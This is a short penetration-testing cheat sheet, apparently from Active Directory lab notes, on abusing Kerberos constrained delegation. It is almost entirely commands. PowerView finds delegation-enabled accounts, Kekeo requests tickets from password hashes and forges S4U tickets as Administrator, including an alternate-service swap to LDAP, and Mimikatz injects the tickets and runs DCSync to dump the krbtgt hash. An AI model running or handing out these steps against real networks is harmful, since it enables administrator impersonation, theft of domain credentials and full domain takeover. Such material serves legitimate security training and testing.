# Constrained Delegation

#### Enumerate

**Enumerate users with constrained delegation enabled**

```
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

**Enumerate computers with constrained delegation enabled**

```
Get-Domaincomputer -TrustedToAuth
Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

## Constrained delegation User

**Requesting TGT with kekeo**

```
./kekeo.exe
Tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
```

**Requesting TGS with kekeo**

```
Tgs::s4u /tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
```

**Use Mimikatz to inject the TGS ticket**

```
Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
```

## Constrained delegation Computer

**Requesting TGT with a PC hash**

```
./kekeo.exe
Tgt::ask /user:dcorp-adminsrv$ /domain:<domain> /rc4:<hash>
```

**Requesting TGS**

No validation for the SPN specified

```
Tgs::s4u /tgt:<kirbi file> /user:Administrator@<domain> /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```

**Using mimikatz to inject TGS ticket and executing DCsync**

```
Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
```
